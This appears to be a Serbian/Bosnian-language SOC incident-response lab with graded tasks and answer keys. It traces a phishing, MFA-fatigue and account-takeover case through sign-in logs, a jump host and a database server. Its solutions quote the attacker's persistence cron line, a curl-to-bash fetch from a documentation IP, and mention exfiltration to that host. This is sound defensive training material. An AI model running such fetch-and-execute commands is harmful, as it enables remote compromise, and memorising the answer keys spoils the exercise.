# Lab 1: Od phishing poruke do baze podataka

Utorak, 13. oktobar 2026, 11:38 po lokalnom vremenu (CEST, UTC+2). Helpdesk prosljeđuje SOC-u tiket: Jelena Kovač, inženjerka infrastrukture u firmi Drina Logistika, kliknula je link iz maila „IT podrške“, upisala lozinku i nakon niza MFA zahtjeva jedan odobrila. Ti si dežurni analitičar. Dokazi su već prikupljeni u `/root`:

| Putanja | Šta je |
|---|---|
| `tiket.txt` | prijava sa helpdeska (lokalno vrijeme) |
| `mail/hitno-mfa.eml` | originalna poruka sa zaglavljima i prilogom |
| `data/SigninLogs.csv`, `data/AuditLogs.csv` | Entra ID prijave i audit za 12. i 13. oktobar (tabele za `kql`) |
| `logs/vpn.log` | OpenVPN server (prijava preko Entra ID-a) |
| `logs/jump01-auth.log`, `logs/db01-auth.log` | `auth.log` sa jump hosta i servera baze |
| `logs/wazuh-alerts.json` | Wazuh alarmi za oba hosta (jedan JSON po redu) |
| `jump01/` | snimak dijela fajl sistema jump01: home direktorij `jkovac`, crontabovi |

Svi logovi su u **UTC**. Odgovore upisuj u `/root/odgovori/`, upite u `/root/kql/`, a izvještaj u `/root/izvjestaj/`.

```bash
cat tiket.txt
kql -c 'SigninLogs | getschema'
kql -c 'SigninLogs | take 3'
```

<!-- timer
60
-->

<!-- setup
set -e
cp -r /opt/scenariji/02-phishing-i-nalog/. /root/
mkdir -p /root/odgovori /root/kql /root/izvjestaj
-->

## Phishing poruka i IOC-ovi

Pregledaj zaglavlja poruke `mail/hitno-mfa.eml`: ko je stvarni pošiljalac, sa koje IP adrese je poruka stigla na `mx01`, šta kažu SPF, DKIM i DMARC i kuda vodi link. Izvuci prilog i izračunaj njegov SHA-256.

U `/root/odgovori/ioc.txt` upiši, svaki u svom redu:

1. IP adresu servera koji je poslao poruku (iz zaglavlja `Received` koje je dodao **naš** `mx01`),
2. domen napadača (iz `smtp.mailfrom`, DKIM `d=` i linka),
3. SHA-256 priloga (64 heksadecimalna znaka).

```bash
grep -nE '^(Received|Authentication-Results|Return-Path|From|Reply-To|Date|Message-ID):' -A3 mail/hitno-mfa.eml
python3 - <<'EOF'
import email, hashlib
m = email.message_from_file(open('/root/mail/hitno-mfa.eml'))
for p in m.walk():
    if p.get_content_maintype() == 'multipart':
        continue
    data = p.get_payload(decode=True)
    print(p.get_content_type(), p.get_filename(), hashlib.sha256(data).hexdigest())
    print(data.decode(errors='replace')[:600])
EOF
```

<!-- verify
f=/root/odgovori/ioc.txt
[ -s $f ] || { echo "nema $f"; exit 1; }
grep -q '198\.51\.100\.61' $f || { echo "nedostaje IP adresa servera koji je poslao poruku (Received od mx01)"; exit 1; }
grep -qi 'drinalog-sso\.example' $f || { echo "nedostaje domen napadača"; exit 1; }
h=$(python3 -c 'import email,hashlib,sys;m=email.message_from_file(open(sys.argv[1]));print([hashlib.sha256(p.get_payload(decode=True)).hexdigest() for p in m.walk() if p.get_filename()][0])' /root/mail/hitno-mfa.eml)
grep -qi "$h" $f || { echo "nedostaje SHA-256 priloga MFA-registracija.htm"; exit 1; }
-->
<!-- hint
Zaglavlja `Received` čitaš odozdo nagore; vjeruješ samo onima koja su dodali tvoji serveri. `From` kaže `drinalog.example`, ali SPF i DKIM su prošli za **drugi** domen, pa DMARC (koji traži poravnanje sa `From`) pada. Politika `p=none` znači da je poruka ipak isporučena. Prikazani tekst linka (`login.microsoftonline.com`) nije isto što i `href`.
-->
<!-- solution
h=$(python3 -c 'import email,hashlib,sys;m=email.message_from_file(open(sys.argv[1]));print([hashlib.sha256(p.get_payload(decode=True)).hexdigest() for p in m.walk() if p.get_filename()][0])' /root/mail/hitno-mfa.eml)
printf '198.51.100.61\ndrinalog-sso.example\nlogin.drinalog-sso.example\n%s\n' "$h" > /root/odgovori/ioc.txt
-->

## MFA umor u prijavama

Kod `500121` u `SigninLogs` znači da drugi faktor nije prošao (korisnik je odbio zahtjev ili ga nije potvrdio). Napiši `/root/kql/mfa.kql` koji pronalazi parove korisnik–IP adresa sa **najmanje 5** takvih neuspjeha. Kolone: `UserPrincipalName`, `IPAddress`, `MfaDenied`. Rezultat snimi u `/root/kql/mfa.csv`.

```kql
SigninLogs
| where ResultType == 500121
| summarize ...
```

<!-- verify
[ -f /root/kql/mfa.kql ] || { echo "nema /root/kql/mfa.kql"; exit 1; }
rm -f /root/kql/mfa.csv; kql /root/kql/mfa.kql >/dev/null 2>&1
kql-isto /root/kql/mfa.csv 'SigninLogs | where ResultType == 500121 | summarize MfaDenied = count() by UserPrincipalName, IPAddress | where MfaDenied >= 5' sort || { echo "rezultat nije tačan (kolone UserPrincipalName, IPAddress, MfaDenied; samo parovi sa >= 5)"; cat /root/kql/mfa.csv 2>/dev/null; exit 1; }
-->
<!-- hint
```kql
SigninLogs
| where ResultType == 500121
| summarize MfaDenied = count() by UserPrincipalName, IPAddress
| where MfaDenied >= 5
.save /root/kql/mfa.csv
```
Bez praga dobijaš i Nikolu i Anu: jedan ili dva istekla MFA zahtjeva su normalna. Sedam odbijanja za 8 minuta sa nepoznate adrese nisu.
-->
<!-- solution
printf 'SigninLogs\n| where ResultType == 500121\n| summarize MfaDenied = count() by UserPrincipalName, IPAddress\n| where MfaDenied >= 5\n.save /root/kql/mfa.csv\n' > /root/kql/mfa.kql
kql /root/kql/mfa.kql >/dev/null
-->

## Šta je napadač uradio sa nalogom

Napiši `/root/kql/napadac.kql`: sve **uspješne** prijave (`ResultType == 0`) sa napadačeve IP adrese, kolone `TimeGenerated`, `AppDisplayName`, `AuthenticationRequirement`, `SessionId`, od najstarije. Snimi u `/root/kql/napadac.csv`.

Zatim upiši:

- `/root/odgovori/ip.txt`: napadačevu IP adresu,
- `/root/odgovori/prva-prijava.txt`: vrijeme prve uspješne prijave napadača u UTC (`2026-10-13T08:00:00Z`),
- `/root/odgovori/mfa-registracija.txt`: vrijeme (UTC) kad je na Jelenin nalog registrovan novi MFA metod (tabela `AuditLogs`).

Uporedi Jelenine uspješne prijave po zemljama: koliko minuta prođe između prijave iz Srbije i prijave iz Holandije?

<!-- verify
[ -f /root/kql/napadac.kql ] || { echo "nema /root/kql/napadac.kql"; exit 1; }
rm -f /root/kql/napadac.csv; kql /root/kql/napadac.kql >/dev/null 2>&1
kql-isto /root/kql/napadac.csv 'SigninLogs | where IPAddress == "203.0.113.77" and ResultType == 0 | project TimeGenerated, AppDisplayName, AuthenticationRequirement, SessionId | order by TimeGenerated asc' || { echo "napadac.csv nije tačan (uspješne prijave sa napadačeve IP, 4 kolone, rastuće po vremenu)"; exit 1; }
grep -qx '203\.0\.113\.77' /root/odgovori/ip.txt 2>/dev/null || { echo "ip.txt treba da sadrži samo napadačevu IP adresu"; exit 1; }
grep -Eq '2026-10-13[T ]08:12:05' /root/odgovori/prva-prijava.txt 2>/dev/null || { echo "prva-prijava.txt: vrijeme prve uspješne prijave napadača nije tačno (UTC)"; exit 1; }
grep -Eq '2026-10-13[T ]08:15:02' /root/odgovori/mfa-registracija.txt 2>/dev/null || { echo "mfa-registracija.txt: vrijeme registracije MFA metoda nije tačno (UTC)"; exit 1; }
-->
<!-- hint
```kql
SigninLogs
| where UserPrincipalName == "jelena.kovac@drinalog.example" and ResultType == 0
| project TimeGenerated, IPAddress, Location, AppDisplayName, SessionId
| order by TimeGenerated asc

AuditLogs
| where InitiatedByIP == "203.0.113.77"
```
Isti `SessionId` na svim napadačevim prijavama i `singleFactorAuthentication` poslije prve: napadač više ne treba MFA, jer koristi token sesije koju je Jelena odobrila. Zato reset lozinke nije dovoljan; sesije se moraju opozvati.
-->
<!-- solution
printf 'SigninLogs\n| where IPAddress == "203.0.113.77" and ResultType == 0\n| project TimeGenerated, AppDisplayName, AuthenticationRequirement, SessionId\n| order by TimeGenerated asc\n.save /root/kql/napadac.csv\n' > /root/kql/napadac.kql
kql /root/kql/napadac.kql >/dev/null
echo 203.0.113.77 > /root/odgovori/ip.txt
echo 2026-10-13T08:12:05Z > /root/odgovori/prva-prijava.txt
echo 2026-10-13T08:15:02Z > /root/odgovori/mfa-registracija.txt
-->

## Od VPN-a do jump01 i perzistencija

Među napadačevim prijavama je i aplikacija `Drina VPN`. Nađi u `logs/vpn.log` koju je internu adresu napadač dobio, pa u `logs/jump01-auth.log` kada se sa nje prijavio na jump01 i kojom metodom (Jelena inače koristi ključ). Zatim pregledaj snimak `jump01/`: šta je napadač ostavio da bi se vratio?

Upiši:

- `/root/odgovori/vpn-ip.txt`: interna VPN adresa napadača,
- `/root/odgovori/ssh-prijava.txt`: vrijeme SSH prijave napadača na jump01 (UTC, `2026-10-13T08:00:00Z`),
- `/root/odgovori/perzistencija.txt`: SHA-256 otisak (fingerprint) ključa koji je napadač dodao u `authorized_keys` (oblik `SHA256:...`) i IP adresu sa koje cron preuzima skriptu.

```bash
grep 203.0.113.77 logs/vpn.log
grep -n 'jkovac' logs/jump01-auth.log
awk '{print $1, substr($2, 1, 24) "...", $3}' jump01/home/jkovac/.ssh/authorized_keys
ssh-keygen -lf jump01/home/jkovac/.ssh/authorized_keys
cat jump01/var/spool/cron/crontabs/jkovac jump01/home/jkovac/.bash_history
```

<!-- verify
grep -qx '10\.8\.0\.23' /root/odgovori/vpn-ip.txt 2>/dev/null || { echo "vpn-ip.txt treba da sadrži samo internu VPN adresu napadača"; exit 1; }
grep -Eq '2026-10-13[T ]08:24:02' /root/odgovori/ssh-prijava.txt 2>/dev/null || { echo "ssh-prijava.txt: vrijeme SSH prijave napadača nije tačno"; exit 1; }
f=/root/odgovori/perzistencija.txt
[ -s $f ] || { echo "nema $f"; exit 1; }
grep deploy@build-07 /root/jump01/home/jkovac/.ssh/authorized_keys > /tmp/.vk
fp=$(ssh-keygen -lf /tmp/.vk | awk '{print $2}'); rm -f /tmp/.vk
grep -qF "$fp" $f || { echo "nedostaje otisak napadačevog ključa (ssh-keygen -lf)"; exit 1; }
grep -qF 'SHA256:cXDy5ky' $f && { echo "to je Jelenin legitimni ključ, ne napadačev"; exit 1; }
grep -q '198\.51\.100\.23' $f || { echo "nedostaje IP adresa iz cron posla"; exit 1; }
exit 0
-->
<!-- hint
Pivot ide preko tri izvora: `SigninLogs` (aplikacija Drina VPN, 08:20:44) → `vpn.log` (javna IP 203.0.113.77 dobija 10.8.0.23) → `auth.log` (`Accepted password for jkovac from 10.8.0.23`). Linux nalog `jkovac` i Entra nalog `jelena.kovac@...` su ista osoba preko SSSD-a, pa ista ukradena lozinka otvara i SSH.

`ssh-keygen -lf authorized_keys` ispisuje otisak svakog ključa. Komentar `deploy@build-07` je samo tekst koji napadač bira; Jelena nema build server.
-->
<!-- solution
echo 10.8.0.23 > /root/odgovori/vpn-ip.txt
echo 2026-10-13T08:24:02Z > /root/odgovori/ssh-prijava.txt
ssh-keygen -lf /root/jump01/home/jkovac/.ssh/authorized_keys | grep deploy@build-07 | awk '{print $2}' > /root/odgovori/perzistencija.txt
echo '198.51.100.23 (cron: curl http://198.51.100.23/k.sh | bash)' >> /root/odgovori/perzistencija.txt
-->

## Lateralno kretanje i Wazuh alarmi

Wazuh je sve vrijeme radio, ali niko nije gledao alarme nižeg nivoa. Napravi jq upit koji iz `logs/wazuh-alerts.json` izdvaja alarme od **13. oktobra** sa `rule.level` **5 ili više**, kao red `timestamp<TAB>agent.name<TAB>rule.id`, redom kojim su u fajlu. Rezultat snimi u `/root/odgovori/alarmi.tsv`.

Zatim u `/root/odgovori/lateralno.txt` upiši na koji host je napadač prešao sa jump01 i koju bazu je izvukao.

```bash
jq -c '{t: .timestamp, a: .agent.name, l: .rule.level, d: .rule.description}' logs/wazuh-alerts.json
jq 'select(.agent.name == "db01" and .rule.id == "100310")' logs/wazuh-alerts.json
grep -n '10.20.0.10' logs/db01-auth.log
```

<!-- verify
f=/root/odgovori/alarmi.tsv
[ -s $f ] || { echo "nema $f"; exit 1; }
ref=$(jq -r 'select(.rule.level >= 5 and (.timestamp | startswith("2026-10-13"))) | [.timestamp, .agent.name, .rule.id] | @tsv' /root/logs/wazuh-alerts.json)
[ "$(cat $f)" = "$ref" ] || { echo "alarmi.tsv nije tačan (13.10, level >= 5, timestamp/agent.name/rule.id odvojeni tabom)"; exit 1; }
l=/root/odgovori/lateralno.txt
grep -Eqi 'db01|10\.20\.0\.31' $l 2>/dev/null || { echo "lateralno.txt: na koji host je napadač prešao?"; exit 1; }
grep -qi 'crm' $l || { echo "lateralno.txt: koju bazu je napadač izvukao?"; exit 1; }
-->
<!-- hint
```bash
jq -r 'select(.rule.level >= 5 and (.timestamp | startswith("2026-10-13")))
       | [.timestamp, .agent.name, .rule.id] | @tsv' logs/wazuh-alerts.json > odgovori/alarmi.tsv
```
Alarm 531 (disk) je šum. Ostala tri pričaju priču: izmijenjen `authorized_keys` (550), izmijenjen crontab (2832) i `pg_dump` baze `crm` na db01 (100310). Prijava na db01 ključem `jkovac@jump01` izgleda kao Jelenin svakodnevni rad: privatni ključ leži na jump01, pa ga napadač samo iskoristi.
-->
<!-- solution
jq -r 'select(.rule.level >= 5 and (.timestamp | startswith("2026-10-13"))) | [.timestamp, .agent.name, .rule.id] | @tsv' /root/logs/wazuh-alerts.json > /root/odgovori/alarmi.tsv
echo 'db01 (10.20.0.31): pg_dump baze crm u /tmp/.cache.sql, scp na jump01 i curl na 198.51.100.23' > /root/odgovori/lateralno.txt
-->

## Plan obuzdavanja

Napiši `/root/izvjestaj/obuzdavanje.md`: kontrolnu listu akcija **redom kojim bi ih izvršio**, sa kratkim obrazloženjem. Lista mora pokriti:

- nalog: opoziv sesija (revoke sessions), reset lozinke, uklanjanje MFA metoda koji je dodao napadač,
- mrežu: blokadu napadačeve IP adrese i C2 adrese,
- jump01: uklanjanje ključa iz `authorized_keys` i cron posla (poslije prikupljanja dokaza),
- db01 i ključ `id_ed25519` sa jump01 koji je napadač iskoristio.

<!-- verify
f=/root/izvjestaj/obuzdavanje.md
[ -s $f ] || { echo "nema $f"; exit 1; }
grep -Eqi 'revoke|opoz' $f || { echo "nedostaje opoziv sesija (revoke)"; exit 1; }
grep -Eqi 'lozink|password' $f || { echo "nedostaje reset lozinke"; exit 1; }
grep -Eqi 'mfa|authenticator' $f || { echo "nedostaje uklanjanje napadačevog MFA metoda"; exit 1; }
grep -q '203\.0\.113\.77' $f || { echo "nedostaje blokada napadačeve IP adrese"; exit 1; }
grep -q '198\.51\.100\.23' $f || { echo "nedostaje blokada C2 adrese"; exit 1; }
grep -q 'authorized_keys' $f || { echo "nedostaje uklanjanje ključa iz authorized_keys"; exit 1; }
grep -Eqi 'cron' $f || { echo "nedostaje uklanjanje cron posla"; exit 1; }
grep -Eqi 'id_ed25519|rotir|rotat' $f || { echo "nedostaje rotacija ključa id_ed25519 sa jump01"; exit 1; }
-->
<!-- hint
Redoslijed je bitan. Prvo zatvori pristup koji napadač **sada** ima (sesije, lozinka, MFA metod, VPN i IP), jer svaki minut čekanja znači nove akcije. Dokaze sa jump01 (crontab, `authorized_keys`, `.bash_history`) sačuvaj sa hashom **prije** brisanja. Ne gasi jump01 naglo: izgubio bi procese i mrežne veze.
-->
<!-- solution
cat > /root/izvjestaj/obuzdavanje.md <<'EOF'
Obuzdavanje: jelena.kovac / jump01 / db01

1. Entra ID: revoke sessions (Revoke-MgUserSignInSession) za jelena.kovac, jer napadač koristi token sesije.
2. Reset lozinke (ista lozinka važi i za SSSD na jump01), privremeno blokiran sign-in do završetka.
3. Ukloniti MFA metod Authenticator App (SM-A546B) koji je napadač registrovao u 08:15:02.
4. Prekinuti VPN sesiju 10.8.0.23; blokirati 203.0.113.77 na VPN-u i firewallu, 198.51.100.23 (C2) na egressu.
5. jump01: prikupiti dokaze (crontab, authorized_keys, .bash_history, auth.log) sa SHA-256, pa ukloniti ključ deploy@build-07 iz authorized_keys i cron posao.
6. Rotirati ključ id_ed25519 sa jump01 (ukloniti jkovac@jump01 iz authorized_keys na db01 i app01).
7. db01: obrisati /tmp/.cache.sql poslije prikupljanja, procijeniti curenje baze crm (obavještavanje).
EOF
-->

## Vremenska linija i izvještaj

Napravi `/root/izvjestaj/vremenska-linija.csv` sa zaglavljem `time_utc,source,event` i najmanje 8 događaja, sortiranih po vremenu, sa vremenom u obliku `2026-10-13T08:12:05Z`. Linija mora sadržati prijem poruke, prvu uspješnu prijavu napadača, SSH prijavu na jump01, izmjenu `authorized_keys`, izmjenu crontaba, prijavu na db01 i `pg_dump`.

Zatim napiši kratak `/root/izvjestaj/izvjestaj.md` sa odjeljcima: sažetak, uzrok (root cause), uticaj, preporuke.

<!-- verify
f=/root/izvjestaj/vremenska-linija.csv
[ -s $f ] || { echo "nema $f"; exit 1; }
[ "$(head -1 $f | tr -d '\r')" = "time_utc,source,event" ] || { echo "prvi red mora biti time_utc,source,event"; exit 1; }
[ "$(tail -n +2 $f | grep -c .)" -ge 8 ] || { echo "treba najmanje 8 događaja"; exit 1; }
tail -n +2 $f | grep . | cut -d, -f1 | grep -Evq '^2026-10-1[23]T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$' && { echo "svako vrijeme mora biti u obliku 2026-10-13T08:12:05Z"; exit 1; }
tail -n +2 $f | grep . | cut -d, -f1 | sort -c 2>/dev/null || { echo "događaji nisu sortirani po vremenu"; exit 1; }
for x in 07:42:10 08:12:05 08:24:02 08:26:41 08:27:15 08:30:58 08:33:40; do
  grep -q "^2026-10-13T$x" $f || { echo "nedostaje ključni događaj u $x UTC"; exit 1; }
done
r=/root/izvjestaj/izvjestaj.md
[ -s $r ] || { echo "nema $r"; exit 1; }
grep -Eqi 'sažetak|sazetak|summary' $r || { echo "izvještaj nema sažetak"; exit 1; }
grep -Eqi 'uzrok|root cause' $r || { echo "izvještaj nema uzrok"; exit 1; }
grep -Eqi 'uticaj|impact' $r || { echo "izvještaj nema uticaj"; exit 1; }
grep -Eqi 'preporu|recommend' $r || { echo "izvještaj nema preporuke"; exit 1; }
-->
<!-- hint
Vrijeme iz zaglavlja `Date: ... +0200` i iz tiketa (CEST) pretvori u UTC (oduzmi 2 sata). `auth.log` nema godinu, ali host radi u UTC. Wazuh `timestamp` ima milisekunde i `+0000`: skrati ga na sekunde i dodaj `Z`.

```text
time_utc,source,event
2026-10-13T07:42:10Z,mx01,Phishing poruka primljena (198.51.100.61)
2026-10-13T08:12:05Z,SigninLogs,Prva uspješna prijava napadača poslije 7 odbijenih MFA zahtjeva
...
```
-->
<!-- solution
cat > /root/izvjestaj/vremenska-linija.csv <<'EOF'
time_utc,source,event
2026-10-13T07:42:10Z,mx01,Phishing poruka primljena od 198.51.100.61 (DMARC fail p=none)
2026-10-13T08:03:12Z,SigninLogs,Prvi pokušaj prijave sa 203.0.113.77 (NL) ispravnom lozinkom
2026-10-13T08:12:05Z,SigninLogs,Uspješna prijava napadača poslije 7 odbijenih MFA zahtjeva
2026-10-13T08:15:02Z,AuditLogs,Napadač registrovao Authenticator App
2026-10-13T08:20:52Z,vpn.log,VPN sesija napadača dobila 10.8.0.23
2026-10-13T08:24:02Z,jump01 auth.log,SSH prijava jkovac lozinkom sa 10.8.0.23
2026-10-13T08:26:41Z,Wazuh 550,Izmijenjen /home/jkovac/.ssh/authorized_keys
2026-10-13T08:27:15Z,jump01 auth.log,Izmijenjen crontab jkovac (curl 198.51.100.23 | bash)
2026-10-13T08:30:58Z,db01 auth.log,SSH sa jump01 na db01 ključem jkovac@jump01
2026-10-13T08:33:40Z,Wazuh 100310,pg_dump baze crm u /tmp/.cache.sql
2026-10-13T09:38:00Z,tiket,Jelena prijavila incident helpdesku
EOF
cat > /root/izvjestaj/izvjestaj.md <<'EOF'
Izvještaj: kompromitovan nalog jelena.kovac

Sažetak: phishing poruka je ukrala lozinku, MFA umor je napadaču dao sesiju, a ista lozinka SSH na jump01.
Napadač je ostavio ključ i cron i izvukao bazu crm sa db01.
Uzrok (root cause): DMARC p=none, push MFA bez number matchinga, ista lozinka za Entra ID i SSH, privatni ključ na jump01.
Uticaj: moguće curenje baze crm (lični podaci klijenata), kompromitovani jump01 i db01.
Preporuke: DMARC p=reject, number matching ili FIDO2, SSH samo ključem, bez privatnih ključeva na jump hostu, alarm na 5+ MFA odbijanja.
EOF
-->
